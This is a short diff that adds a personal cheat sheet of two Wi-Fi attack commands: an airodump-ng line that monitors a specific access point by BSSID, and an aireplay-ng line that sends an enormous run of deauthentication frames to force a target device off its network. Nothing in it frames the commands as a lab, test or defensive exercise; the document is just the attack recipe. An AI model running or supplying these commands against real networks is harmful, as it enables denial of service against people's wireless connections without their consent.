@@ -1,0 +1,7 @@
+To see the target device =>
+
+    airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 1  wlx1cbfce04e4dd
+
+To deauthenticate target device from network =>
+
+    aireplay-ng --deauth 10000000000 -a host_mac -c target_mac wlx1cbfce04e4dd
